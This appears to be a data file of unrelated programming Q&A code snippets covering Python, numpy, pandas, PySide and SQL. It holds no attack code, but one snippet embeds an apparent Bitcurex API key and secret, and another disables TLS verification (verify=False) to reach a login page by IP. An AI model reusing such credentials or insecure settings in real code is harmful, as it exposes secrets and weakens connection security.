"def assignment ( self , node , children ) : 'assignment = lvalue `` = '' expr ' lvalue , _ , expr = children self.env [ lvalue ] = expr return expr def assignment ( self , node , children ) : 'assignment = `` SET '' lvalue `` , '' expr ' _ , lvalue , _ , expr = children self.env [ lvalue ] = expr return expr parsimonious.exceptions.IncompleteParseError : Rule 'program ' matched in its entirety , but it did n't consume all the text . The non-matching portion of the text begins with 'SET a , 7 ' ( line 1 , column 1 ) ."
.├── file_a.py├── file_b│ └── __init__.py└── file_b.py from file_b import some_function
"import clr # pythonnet 2.3.0import osimport tkinter as tkfrom tkinter.filedialog import ( askdirectory , askopenfilename ) root = tk.Tk ( ) root.withdraw ( ) PPath=askdirectory ( title= '' Please select your installation folder location '' , initialdir=r '' C : \Program Files\\ '' ) t= '' Please select jdk file '' if os.path.exists ( os.path.expanduser ( '~\Documents ' ) ) : FFile = askopenfilename ( filetypes= ( ( `` jdk file '' , `` *.jdk '' ) , ( `` All Files '' , `` * . * '' ) ) , title=t , initialdir=os.path.expanduser ( '~\Documents ' ) ) else : FFile= askopenfilename ( filetypes= ( ( `` jdk file '' , `` *.jdk '' ) , ( `` All Files '' , `` * . * '' ) ) , title=t ) sys.path.append ( marsDllPath ) a = clr.AddReference ( 'MatlabFunctions ' ) aObj = a.CreateInstance ( 'Example.MatlabFunctions.MatLabFunctions ' )"
"from pylab import *array_by_hand = array ( [ [ [ 1 , 2 , 3 , 4 ] , [ 1 , 2 , 3 , 4 ] ] , [ [ 1 , 2 , 3 , 4 ] , [ 1 , 2 , 3 , 4 ] ] ] , dtype='uint8 ' ) layers = 1 * ones ( ( 2 , 2 ) ) , 2 * ones ( ( 2 , 2 ) ) , 3 * ones ( ( 2 , 2 ) ) , 4 * ones ( ( 2 , 2 ) ) array_from_layers = dstack ( layers ) array_from_layers = array_from_layers.astype ( 'uint8 ' ) print array_by_hand ; printprint array_from_layers ; printprint ' '.join ( x.encode ( 'hex ' ) for x in array_by_hand.data ) print ' '.join ( x.encode ( 'hex ' ) for x in array_from_layers.data ) printprint all ( array_by_hand == array_from_layers ) # Trueprint str ( array_by_hand.data ) == str ( array_from_layers.data ) # False"
day Object1 Object22017-01-01 6000 1234 day Object1 Object22017-01-01 1:40:00 00:20:34
"myList = [ ' a ' , ' b ' , ' c ' , 'd ' ] myDict = { } x= [ myDict.update ( { item : None } ) for item in myList ] > > > myDict { ' a ' : None , ' c ' : None , ' b ' : None , 'd ' : None }"
"void find_vertex ( vertex *list , int len , vertex* lower , vertex* highter ) { int i ; *lower=list [ 0 ] ; *highter=list [ 1 ] ; for ( i=0 ; i < len ; i++ ) { if ( ( list [ i ] .x < =lower- > x ) & & ( list [ i ] .y < =lower- > y ) ) *lower=list [ i ] ; else { if ( ( list [ i ] .x > =highter- > x ) & & ( list [ i ] .y > =highter- > y ) ) *highter=list [ i ] ; } } } vertex *square_list_of_vertex ( vertex *list , int len , vertex start , float size ) { int i=0 , a=0 ; unsigned int *num ; num= ( int* ) malloc ( sizeof ( unsigned int ) *len ) ; if ( num==NULL ) { printf ( `` Ca n't allocate the memory '' ) ; return 0 ; } //controlls which points are in the right position and adds their index from the main list in another list for ( i=0 ; i < len ; i++ ) { if ( ( list [ i ] .x-start.x ) < size & & ( list [ i ] .y-start.y < size ) ) { if ( list [ i ] .y-start.y > -size/100 ) { num [ a ] =i ; a++ ; //len of the list to return } } } //create the list with the right vertices vertex *retlist ; retlist= ( vertex* ) malloc ( sizeof ( vertex ) * ( a+1 ) ) ; if ( retlist==NULL ) { printf ( `` Ca n't allocate the memory '' ) ; return 0 ; } //the first index is used only as an info container vertex infos ; infos.index=a+1 ; retlist [ 0 ] =infos ; //set the value for the return pointer for ( i=1 ; i < =a ; i++ ) { retlist [ i ] =list [ num [ i-1 ] ] ; } return retlist ; } typedef struct { int index ; float x , y ; } vertex ;"
"def fib3 ( n ) : a , b=0,1 while n > 0 : a , b=b , a+b n-=1 return a public static int fib2 ( int n ) { int a = 0 ; int b =1 ; while ( n -- > 0 ) { a=b ; b=a+b ; } return a ; }"
"import mathimport timeimport simplejsonimport urllibimport urllib2import hmac , hashlibdef microtime ( ) : return ' % f % d ' % math.modf ( time.time ( ) ) def query ( path , key , secret , data= { } ) : mt = microtime ( ) .split ( ) nonce = mt [ 1 ] + mt [ 0 ] [ 2 : ] data [ 'nonce ' ] = nonce post_data = urllib.urlencode ( data ) sign = hmac.new ( secret.decode ( 'base64 ' ) , post_data , hashlib.sha512 ) .digest ( ) headers = { 'Rest-Key ' : key , 'Rest-Sign ' : sign.encode ( 'base64 ' ) .strip ( ) , 'User-Agent ' : 'Mozilla/4.0 ( compatible ; MSIE 5.5 ; Windows NT ) ' , 'Content-type ' : 'application/x-www-form-urlencoded ' } print headers url = 'https : //bitcurex.com/api/0/ ' + path req = urllib2.Request ( url , post_data , headers ) response = urllib2.urlopen ( req ) return simplejson.loads ( response.read ( ) ) print query ( 'getFunds ' , '29a28e8fe234537056a8b256c0df50413f50da9c49ca61991ea8b8f108a88e09 ' , 'y2NDxKGa/xvhtXrDP+3oscbBUFSac9+T8jzu2nRmt0vBdHbbl8NRqdmxKFr2IwwY5LAskTQZGyy2XONaNN6Jrg== ' ) POST /api/0/getFunds HTTP/1.1Accept-Encoding : identityRest-Sign : Dd1WBn2T5SYTbqMMohOxr46IaLDrkelgH7AgkrrB0mT0PxKfv15vSJ3b6xNdc5PO2Yz9cDpu0u/HWIc7bH56sQ== : Content-Length : 22Rest-Key : 29a28e8fe234537056a8b256c0df50413f50da9c49ca61991ea8b8f108a88e09Connection : closeUser-Agent : Mozilla/4.0 ( compatible ; MSIE 5.5 ; Windows NT ) Host : bitcurex.comContent-Type : application/x-www-form-urlencoded Incorrectly formed request headers.Missing colon in header # 3 , WIc7bH56sQ=="
"Python ( 22498,0xa02e3720 ) malloc : *** mmap ( size=1340379136 ) failed ( error code=12 ) *** error : ca n't allocate region*** set a breakpoint in malloc_error_break to debugProcess Python bus error"
"> > > text = ' á ' > > > text'\xc3\xa1 ' > > > text.decode ( 'utf-8 ' ) u'\xe1 ' > > > unicode ( text ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > UnicodeDecodeError : 'ascii ' codec ca n't decode byte 0xc3 in position 0 : ordinal not in range ( 128 ) > > > unicode ( text , 'utf-8 ' ) u'\xe1 ' > > > unicode ( text , 'utf-8 ' ) == text.decode ( 'utf-8 ' ) True > > > class ReturnsEncoded ( object ) : ... def __str__ ( self ) : ... return text ... > > > r = ReturnsEncoded ( ) > > > str ( r ) '\xc3\xa1 ' > > > unicode ( r ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > UnicodeDecodeError : 'ascii ' codec ca n't decode byte 0xc3 in position 0 : ordinal not in range ( 128 ) > > > unicode ( r , 'utf-8 ' ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : coercing to Unicode : need string or buffer , ReturnsEncoded found"
"import cProfileclass Memoizer ( object ) : `` '' '' A handler for saving function results . '' '' '' def __init__ ( self ) : self.memos = dict ( ) def memo ( self , string ) : if string in self.memos : return self.memos [ string ] else : self.memos [ string ] = eval ( string ) self.memo ( string ) def factorial ( n ) : assert type ( n ) == int if n == 1 : return 1 else : return n * factorial ( n-1 ) # find the factorial of numnum = 500 # this many timestimes = 1000def factorialTwice ( ) : factorial ( num ) for x in xrange ( 0 , times ) : factorial ( num ) return factorial ( num ) def memoizedFactorial ( ) : handler = Memoizer ( ) for x in xrange ( 0 , times ) : handler.memo ( `` factorial ( % d ) '' % num ) return handler.memo ( `` factorial ( % d ) '' % num ) cProfile.run ( 'factorialTwice ( ) ' ) cProfile.run ( 'memoizedFactorial ( ) ' )"
CREATE OR REPLACE FUNCTION get_mod ( modifier varchar ) RETURNS varchar AS $ $ def is_float ( val ) : try : if val : float ( val ) return True else : return False except ValueError : return False if modifier is None : return `` NOMOD '' if is_float ( modifier ) : return str ( float ( modifier ) *1 ) return modifier $ $ LANGUAGE plpythonu ;
"< ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < TEI xmlns= '' http : //www.tei-c.org/ns/1.0 '' > < teiHeader type= '' ISBD-ER '' > < fileDesc > # import the reader method import nltk.corpus.reader as reader # open the sequence of files and the XML doc with the MTECorpusReader oecorpus = reader.mte.MTECorpusReader ( '/Users/me/Documents/0163 ' , ' . * ' ) # print the first few words in the corpus to the interactive shelloecorpus.words ( ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/util.py '' , line 765 , in __repr__ for elt in self : File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/corpus/reader/util.py '' , line 397 , in iterate_from for tok in piece.iterate_from ( max ( 0 , start_tok-offset ) ) : File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/corpus/reader/util.py '' , line 291 , in iterate_from tokens = self.read_block ( self._stream ) File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/corpus/reader/mte.py '' , line 25 , in read_block return list ( filter ( lambda x : x is not None , XMLCorpusView.read_block ( self , stream , tagspec , elt_handler ) ) ) File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/corpus/reader/xmldocs.py '' , line 307 , in read_block xml_fragment = self._read_xml_fragment ( stream ) File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/corpus/reader/xmldocs.py '' , line 252 , in _read_xml_fragment xml_block = stream.read ( self._BLOCK_SIZE ) File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/data.py '' , line 1097 , in read chars = self._read ( size ) File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/data.py '' , line 1367 , in _read chars , bytes_decoded = self._incr_decode ( bytes ) File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/nltk/data.py '' , line 1398 , in _incr_decode return self.decode ( bytes , 'strict ' ) File `` /Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/encodings/utf_8.py '' , line 16 , in decode return codecs.utf_8_decode ( input , errors , True ) UnicodeDecodeError : 'utf-8 ' codec ca n't decode byte 0x80 in position 59 : invalid start byte for file in loglist : bufferfile = open ( file , encoding='utf-8 ' , errors='replace ' ) bufferfile.close ( ) loglist = [ name for name in os.listdir ( ' . ' ) if os.path.isfile ( name ) ]"
"for i in range ( K , N ) f [ i ] = INT_MIN for j in range ( 1 , K+1 ) f [ i ] = max ( f [ i ] , f [ i-j ] + a [ i ] ) return max ( f )"
"0,0 , 00,1 , 10,2 , 21,0 , 31,1 , 41,2 , 52,0 , 62,1 , 72,2 , 8 for x in range ( 3 ) : for y in range ( 3 ) : print ( x , y ) > > > 0 0 > > > 0 1 > > > 0 2 > > > 1 0 > > > 1 1 > > > 1 2 > > > 2 0 > > > 2 1 > > > 2 2"
"errList = [ 'Ragu ate lunch but didnt have Water for drinks ' , 'Rams ate lunch but didnt have Gatorade for drinks ' , 'Saya ate lunch but didnt have : water for drinks ' , 'Raghu ate lunch but didnt have water for drinks ' , 'Hanu ate lunch but didnt have -water for drinks ' , 'Wayu ate lunch but didnt have water for drinks ' , 'Viru ate lunch but didnt have .water 4or drinks ' , 'kk ate lunch & icecream but did have Water for drinks ' , 'M ate lunch & and icecream but did have Gatorade for drinks ' , 'Parker ate lunch icecream but didnt have : water for drinks ' , 'Sassy ate lunch and icecream but didnt have water for drinks ' , 'John ate lunch and icecream but didnt have -water for drinks ' , 'Pokey ate lunch and icecream but didnt have Water for drinks ' , 'Laila ate lunch and icecream but did have water 4or drinks ' , ] { 'ate lunch but didnt have ' : 7 , 'water for drinks ' : 7 , 'ate lunch and icecream ' : 4 , 'didnt have water ' : 3 , 'didnt have Water ' : 2 # case sensitives }"
"index = ( ( 0,0 ) , ( 0,2 ) , ( 2,0 ) , ( 2,2 ) ) elements = [ [ ' a ' , ' b ' , ' c ' ] , [ ' c ' , 'd ' , ' e ' ] , [ ' f ' , ' g ' , ' h ' ] ] for i in index : print ( elements [ i [ 0 ] ] [ i [ 1 ] ] ) # I would like to do this : # print ( elements [ i ] )"
"list1 = [ { 'count ' : 351 , 'att_value ' : 'one ' } , { 'count ' : 332 , 'att_value ' : 'two ' } , { 'count ' : 336 , 'att_value ' : 'six ' } , { 'count ' : 359 , 'att_value ' : 'nine ' } , { 'count ' : 304 , 'att_value ' : 'four ' } ] list2 = [ { 'count ' : 359 , 'person_id ' : 4 } , { 'count ' : 351 , 'person_id ' : 12 } , { 'count ' : 381 , 'person_id ' : 8 } ] list3 = [ { 'count':359 , 'att_value ' : 'nine ' , 'person_id':4 } , { 'count':351 , 'att_value ' : 'one ' , 'person_id':12 } , { 'count':381 , 'att_value ' : '- ' , 'person_id':8 } ]"
"from collections import defaultdict , Counterd = defaultdict ( Counter ) d [ ' x ' ] [ ' b ' ] += 1d [ ' x ' ] [ ' c ' ] += 1print ( d ) defaultdict ( < class 'collections.Counter ' > , { ' x ' : Counter ( { ' c ' : 1 , ' b ' : 1 } ) } ) mystruct = { 'counter ' : collections.Counter ( ) , 'name ' : `` }"
"class DirectorioEstablecimiento ( Base ) : __table_args__ = { 'schema ' : 'schools ' } __tablename__ = 'addresses ' # some Columns are defined here class Matricula ( Base ) : __table_args__ = { 'schema ' : 'students ' } __tablename__ = 'enrollments ' # some Columns are defined here In [ 111 ] : engine.execute ( `` SELECT * FROM pg_namespace '' ) .fetchall ( ) 2017-12-13 18:04:01,006 INFO sqlalchemy.engine.base.Engine SELECT * FROM pg_namespace2017-12-13 18:04:01,006 INFO sqlalchemy.engine.base.Engine { } Out [ 111 ] : [ ( 'pg_toast ' , 10 , None ) , ( 'pg_temp_1 ' , 10 , None ) , ( 'pg_toast_temp_1 ' , 10 , None ) , ( 'pg_catalog ' , 10 , ' { postgres=UC/postgres , =U/postgres } ' ) , ( 'public ' , 10 , ' { postgres=UC/postgres , =UC/postgres } ' ) , ( 'information_schema ' , 10 , ' { postgres=UC/postgres , =U/postgres } ' ) , ( 'schools ' , 16386 , None ) , ( 'students ' , 16386 , None ) ] user # select * from pg_tables ; schemaname | tablename | tableowner | tablespace | hasindexes | hasrules | hastriggers | rowsecurity -- -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -- + -- -- -- -- -- -- + -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- -- -+ -- -- -- -- -- -- - schools | addresses | diego | | t | f | f | f students | enrollments | diego | | t | f | f | f pg_catalog | pg_statistic | postgres | | t | f | f | f pg_catalog | pg_type | postgres | | t | f | f | f pg_catalog | pg_authid | postgres | pg_global | t | f | f | f pg_catalog | pg_user_mapping | postgres | | t | f | f | f -- other tables were omitted In [ 87 ] : Base.metadata.tables.keys ( ) Out [ 87 ] : dict_keys ( [ 'schools.addresses ' , 'students.enrollments ' ] ) In [ 88 ] : new_base = declarative_base ( ) In [ 89 ] : new_base.metadata.reflect ( bind=engine ) In [ 90 ] : new_base.metadata.tables.keys ( ) Out [ 90 ] : dict_keys ( [ ] )"
"import requestsheaders = { 'User-Agent ' : 'Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ; rv:77.0 ) Gecko/20100101 Firefox/77.0 ' } response = requests.get ( `` https : //grimaldis.myguestaccount.com/guest/accountlogin '' , headers=headers ) .textprint ( response ) import urllib.requestheaders = { 'User-Agent ' : 'Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ; rv:77.0 ) Gecko/20100101 Firefox/77.0 ' } request = urllib.request.Request ( `` https : //grimaldis.myguestaccount.com/guest/accountlogin '' , headers=headers ) r = urllib.request.urlopen ( request ) .read ( ) print ( r.decode ( 'utf-8 ' ) ) import requestsfrom collections import OrderedDictimport socket # grab the address using socket.getaddrinfoanswers = socket.getaddrinfo ( 'grimaldis.myguestaccount.com ' , 443 ) ( family , type , proto , canonname , ( address , port ) ) = answers [ 0 ] headers = OrderedDict ( { 'Host ' : `` grimaldis.myguestaccount.com '' , 'User-Agent ' : 'Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ; rv:77.0 ) Gecko/20100101 Firefox/77.0 ' , } ) s = requests.Session ( ) s.headers = headersresponse = s.get ( f '' https : // { address } /guest/accountlogin '' , verify=False ) .text import trioimport httpximport socketfrom collections import OrderedDictanswers = socket.getaddrinfo ( 'grimaldis.myguestaccount.com ' , 443 ) ( family , type , proto , canonname , ( address , port ) ) = answers [ 0 ] headers = OrderedDict ( { 'Host ' : `` grimaldis.myguestaccount.com '' , 'User-Agent ' : 'Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ; rv:77.0 ) Gecko/20100101 Firefox/77.0 ' , } ) async def asks_worker ( ) : async with httpx.AsyncClient ( headers=headers , verify=False ) as s : r = await s.get ( f'https : // { address } /guest/accountlogin ' ) print ( r.text ) async def run_task ( ) : async with trio.open_nursery ( ) as nursery : nursery.start_soon ( asks_worker ) trio.run ( run_task ) send : b'GET /guest/nologin/account-balance HTTP/1.1\r\nAccept-Encoding : identity\r\nHost : grimaldis.myguestaccount.com\r\nUser-Agent : Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ; rv:77.0 ) Gecko/20100101 Firefox/77.0\r\nConnection : close\r\n\r\n'reply : 'HTTP/1.1 403 Forbidden\r\n'header : Date : Thu , 02 Jul 2020 20:20:06 GMTheader : Content-Type : text/html ; charset=UTF-8header : Transfer-Encoding : chunkedheader : Connection : closeheader : CF-Chl-Bypass : 1header : Set-Cookie : __cfduid=df8902e0b19c21b364f3bf33e0b1ce1981593721256 ; expires=Sat , 01-Aug-20 20:20:06 GMT ; path=/ ; domain=.myguestaccount.com ; HttpOnly ; SameSite=Lax ; Secureheader : Cache-Control : private , max-age=0 , no-store , no-cache , must-revalidate , post-check=0 , pre-check=0header : Expires : Thu , 01 Jan 1970 00:00:01 GMTheader : X-Frame-Options : SAMEORIGINheader : cf-request-id : 03b2c8d09300000ca181928200000001header : Expect-CT : max-age=604800 , report-uri= '' https : //report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct '' header : Set-Cookie : __cfduid=df8962e1b27c25b364f3bf66e8b1ce1981593723206 ; expires=Sat , 01-Aug-20 20:20:06 GMT ; path=/ ; domain=.myguestaccount.com ; HttpOnly ; SameSite=Lax ; Secureheader : Vary : Accept-Encodingheader : Server : cloudflareheader : CF-RAY : 5acb25c75c981ca1-EWR send : b'GET /guest/nologin/account-balance HTTP/1.1\r\nAccept-Encoding : identity\r\nHost : grimaldis.myguestaccount.com\r\nUser-Agent : Mozilla/5.0 ( Windows NT 10.0 ; Win64 ; x64 ; rv:77.0 ) Gecko/20100101 Firefox/77.0\r\nConnection : close\r\n\r\n'reply : 'HTTP/1.1 200 OK\r\n'header : Date : Thu , 02 Jul 2020 20:20:01 GMTheader : Content-Type : text/html ; charset=utf-8header : Transfer-Encoding : chunkedheader : Connection : closeheader : Set-Cookie : __cfduid=db9de9687b6c22e6c12b33250a0ded3251292457801 ; expires=Sat , 01-Aug-20 20:20:01 GMT ; path=/ ; domain=.myguestaccount.com ; HttpOnly ; SameSite=Lax ; Secureheader : Expires : Thu , 2 Jul 2020 20:20:01 GMTheader : Cache-Control : no-cache , private , no-storeheader : X-Powered-By : Undertow/1header : Pragma : no-cacheheader : X-Frame-Options : SAMEORIGINheader : Content-Security-Policy : script-src 'self ' 'unsafe-inline ' 'unsafe-eval ' https : //www.google-analytics.com https : //www.google-analytics.com/analytics.js https : //use.typekit.net connect.facebook.net/ https : //googleads.g.doubleclick.net/ app.pendo.io cdn.pendo.io pendo-static-6351154740266000.storage.googleapis.com pendo-io-static.storage.googleapis.com https : //www.google.com/recaptcha/ https : //www.gstatic.com/recaptcha/ https : //www.google.com/recaptcha/api.js apis.google.com https : //www.googletagmanager.com api.instagram.com https : //app-rsrc.getbee.io/plugin/BeePlugin.js https : //loader.getbee.io api.instagram.com https : //bat.bing.com/bat.js https : //www.googleadservices.com/pagead/conversion.js https : //connect.facebook.net/en_US/fbevents.js https : //connect.facebook.net/ https : //fonts.googleapis.com/ https : //ssl.gstatic.com/ https : //tagmanager.google.com/ ; style-src 'unsafe-inline ' * ; img-src * data : ; connect-src 'self ' app.pendo.io api.feedback.us.pendo.io ; frame-ancestors 'self ' app.pendo.io pxsweb.com *.pxsweb.com ; frame-src 'self ' *.myguestaccount.com https : //app.getbee.io/ * ; header : X-Lift-Version : Unknown Lift Versionheader : CF-Cache-Status : DYNAMICheader : cf-request-id : 01b2c5b1fa00002654a25485710000001header : Expect-CT : max-age=604800 , report-uri= '' https : //report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct '' header : Set-Cookie : __cfduid=db9de811004e591f9a12b66980a5dde331592650101 ; expires=Sat , 01-Aug-20 20:20:01 GMT ; path=/ ; domain=.myguestaccount.com ; HttpOnly ; SameSite=Lax ; Secureheader : Set-Cookie : __cfduid=db9de811004e591f9a12b66980a5dde331592650101 ; expires=Sat , 01-Aug-20 20:20:01 GMT ; path=/ ; domain=.myguestaccount.com ; HttpOnly ; SameSite=Lax ; Secureheader : Set-Cookie : __cfduid=db9de811004e591f9a12b66980a5dde331592650101 ; expires=Sat , 01-Aug-20 20:20:01 GMT ; path=/ ; domain=.myguestaccount.com ; HttpOnly ; SameSite=Lax ; Secureheader : Server : cloudflareheader : CF-RAY : 5acb58a62c5b5144-EWR"
"np.r_ [ ' 0,2 ' , [ 1,2,3 ] , [ 4,5,6 ] ] np.r_ ( ' 0,2 ' , [ 1,2,3 ] , [ 4,5,6 ] )"
"> > > import numpy as np > > > np.random.seed ( 123 ) > > > A = np.random.randn ( 3,2 ) > > > Aarray ( [ [ -1.0856306 , 0.99734545 ] , [ 0.2829785 , -1.50629471 ] , [ -0.57860025 , 1.65143654 ] ] ) > > > i=np.argsort ( A , axis=-1 ) > > > A [ i ] array ( [ [ [ -1.0856306 , 0.99734545 ] , [ 0.2829785 , -1.50629471 ] ] , [ [ 0.2829785 , -1.50629471 ] , [ -1.0856306 , 0.99734545 ] ] , [ [ -1.0856306 , 0.99734545 ] , [ 0.2829785 , -1.50629471 ] ] ] ) > > > A = np.array ( [ [ 3,2,1 ] , [ 4,0,6 ] ] ) > > > B = np.array ( [ [ 3,1,4 ] , [ 1,5,9 ] ] ) > > > i = np.argsort ( A , axis=-1 ) > > > BsortA = ? ? ? # should result in [ [ 4,1,3 ] , [ 5,1,9 ] ] # so that corresponding elements of B and sort ( A ) stay together"
> > > import sys > > > 'itertools ' in sys.modulesTrue > > > import sys > > > 'itertools ' in sys.modulesFalse
"Class C ( ) : def f ( ) : return [ 1,2,3 ] c=C ( ) for i in c.f ( ) : print i"
"out = [ ] for cluster in ClusterFile : cluster = list ( cluster ) for term in cluster [ 3 ] : for item in Interest : if term == item [ 0 ] : x = [ item [ 1 ] ] cluster.append ( x ) break out.append ( cluster ) break out = [ ( [ item [ 1 ] ] ) for item in Interest for term in cluster [ 3 ] if term ==item [ 0 ] for cluster in ClusterFile ] cluster = [ [ ' a ' ] , [ 1 , 2 ] , [ 3 , 4 ] , [ [ ' w ' ] , [ ' x ' ] , [ ' y ' ] , [ ' z ' ] ] , [ 5 , 6 ] ] Interest = [ [ ' w ' , 'qx12 ' ] , [ ' y ' , 'qx19 ' ] ] [ [ ' a ' ] , [ 1 , 2 ] , [ 3 , 4 ] , [ [ ' w ' ] , [ ' x ' ] , [ ' y ' ] , [ ' z ' ] ] , [ 5 , 6 ] , [ 'qx12 ' , 'qx19 ' ] ]"
"from xml.dom import minidom # New documentxml = minidom.Document ( ) # Creates user elementuserElem = xml.createElement ( `` user '' ) # Set attributes to user elementuserElem.setAttribute ( `` name '' , `` Sergio Oliveira '' ) userElem.setAttribute ( `` nickname '' , `` seocam '' ) userElem.setAttribute ( `` email '' , `` seocam @ taboca.com '' ) userElem.setAttribute ( `` photo '' , '' seocam.png '' ) # Append user element in xml documentxml.appendChild ( userElem ) # Print the xml codeprint xml.toprettyxml ( ) < ? xml version= '' 1.0 '' ? > < user email= '' seocam @ taboca.com '' name= '' Sergio Oliveira '' nickname= '' seocam '' photo= '' seocam.png '' / >"
"import mechanizeMechBrowser = mechanize.Browser ( ) Counter = 0while Counter < 5000 : Response = MechBrowser.open ( `` http : //example.com/page '' + str ( Counter ) ) Html = Response.read ( ) Response.close ( ) OutputFile = open ( `` Output.txt '' , `` a '' ) OutputFile.write ( Html ) OutputFile.close ( ) Counter = Counter + 1"
"{ `` Date '' : `` 28 Sep 2009 00:00:00 '' , ... . } { `` _id '' : ObjectId ( `` 577a788f4439e17afd4e21f7 '' ) , `` Date '' : ISODate ( `` 2009-09-27T23:00:00Z '' ) } idx = pd.DatetimeIndex ( [ x [ 'Date ' ] for x in test_docs ] , freq='D ' ) idx = pd.DatetimeIndex ( [ x [ 'Date ' ] for x in test_docs ] , freq='D ' ) idx = idx.tz_localize ( tz=tz.tzutc ( ) ) idx = idx.tz_convert ( tz=tz.tzlocal ( ) ) frame = DataFrame ( test_docs , index=idx ) frame = frame.drop ( 'Date ' , 1 ) frame.groupby ( idx ) .sum ( ) idx = pd.DatetimeIndex ( [ x [ 'Date ' ] for x in test_docs ] , freq='D ' ) idx = idx.tz_localize ( tz=tz.tzutc ( ) ) idx = idx.tz_convert ( tz='Europe/Dublin ' ) idx = idx.normalize ( ) frame = DataFrame ( test_docs , index=idx ) ... ... aggregate = frame.groupby ( idx ) .sum ( ) aggregate.plot ( ) idx = idx.tz_convert ( tz.gettz ( 'Europe/Dublin ' ) ) idx = pd.DatetimeIndex ( [ x [ 'Date ' ] for x in test_docs ] , freq='D ' ) idx = idx.tz_localize ( tz=tz.tzutc ( ) ) idx = idx.tz_convert ( tz=tz.tzlocal ( ) ) idx = idx.normalize ( ) frame = DataFrame ( test_docs , index=idx ) aggregate = frame.groupby ( idx.astype ( object ) ) .sum ( )"
"import sys , jsonfrom time import sleepfrom PySide.QtCore import *from PySide.QtGui import *from PySide.QtWebKit import QWebView , QWebSettingsfrom PySide.QtNetwork import QNetworkRequestfrom PySide.QtCore import QObject , Slot , Signal html_str= '' '' '' < ! doctype > < html > < body > hello world < button id= '' button '' > button1 < /button > < button id= '' button2 '' > button2 < /button > < /body > < /html > < script type= '' text/javascript '' > document.getElementById ( `` button '' ) .onclick=function ( ) { object.reply ( `` hello `` ) ; } document.getElementById ( `` button2 '' ) .onclick=function ( ) { object.reply2 ( `` hello `` ) ; } function data_from_js ( msg ) { var tag=document.createElement ( 'div ' ) ; tag.innerHTML= '' message from python '' ; document.body.appendChild ( tag ) ; alert ( msg [ 'name ' ] ) ; } < /script > < style > body { border : solid black 1px ; } < /style > < /doctype > '' '' '' class Qbutton ( QObject ) : from time import sleep def __init__ ( self ) : super ( Qbutton , self ) .__init__ ( ) @ Slot ( str ) def reply ( self , recd ) : # r=QMessageBox.information ( self , '' Info '' , msg ) msgBox = QMessageBox ( ) sleep ( 10 ) msgBox.setText ( `` python just said '' +recd ) msgBox.exec_ ( ) return `` I am recieving pythonic data '' # r=QMessageBox.question ( self , title , recd , QMessageBox.Yes | QMessageBox.No ) @ Slot ( str ) def reply2 ( self , recd ) : msgBox = QMessageBox ( ) msgBox.setText ( `` python just said '' +recd+ `` another time '' ) msgBox.exec_ ( ) return `` I am recieving pythonic data '' @ Slot ( str ) def send_tojs ( self ) : passclass adstar_gui ( QWidget ) : def __init__ ( self ) : super ( adstar_gui , self ) .__init__ ( ) self.setWindowTitle ( `` Adstar Wordlist Generator '' ) self.setMaximumWidth ( 5000 ) self.setMaximumHeight ( 5000 ) self.setMinimumWidth ( 500 ) self.setMinimumHeight ( 500 ) self.show ( ) print `` Sample window '' def closeEvent ( self , event ) : self.closeEvent ( ) if __name__== '' __main__ '' : Qapp=QApplication ( sys.argv ) t=QWebView ( ) t.setHtml ( html_str ) button=Qbutton ( ) t.page ( ) .mainFrame ( ) .addToJavaScriptWindowObject ( `` object '' , button ) t.show ( ) # t.page ( ) .mainFrame ( ) .evaluateJavaScript ( `` data_from_js ( % s ) ; '' % ( json.dumps ( { 'name ' : '' My name is Junior '' } ) ) ) QCoreApplication.processEvents ( ) # sys.exit ( Qapp.exec_ ( ) ) Qapp.exec_ ( )"
"from PySide.QtCore import *from PySide.QtGui import *import multiprocessingimport sysclass MainWindow ( QMainWindow ) : def __init__ ( self , parent=None ) : super ( MainWindow , self ) .__init__ ( parent ) btn = QPushButton ( 'run new instance ' ) btn.clicked.connect ( self.create_daemon ) self.setCentralWidget ( btn ) def create_daemon ( self ) : p = multiprocessing.Process ( target=new_window ) p.start ( ) def new_window ( ) : app=QApplication ( sys.argv ) ex = MainWindow ( ) ex.show ( ) sys.exit ( app.exec_ ( ) ) if __name__== '' __main__ '' : app=QApplication ( sys.argv ) ex = MainWindow ( ) ex.show ( ) sys.exit ( app.exec_ ( ) )"
"response = requests.get ( url , auth=auth , stream=True ) if response.status_code == 200 : stream_csv_into_database ( response ) def stream_csv_into_database ( response ) : . . . for record in csv.DictReader ( response.iter_lines ( ) , delimiter='\t ' ) : product_count += 1 product = { k : v for ( k , v ) in record.iteritems ( ) if v } product [ '_id ' ] = product_count collection.insert ( product ) def stream_csv_into_database ( response , campaign , config ) : print 'Loading product feed for { 0 } '.format ( campaign ) conn = new_redshift_connection ( config ) # My own helper , works fine . table = 'products . ' + campaign cur = conn.cursor ( ) reader = response.iter_lines ( ) # Error on following line : cur.copy_expert ( `` COPY { 0 } FROM STDIN WITH CSV HEADER DELIMITER '\t ' '' .format ( table ) , reader ) conn.commit ( ) cur.close ( ) conn.close ( )"
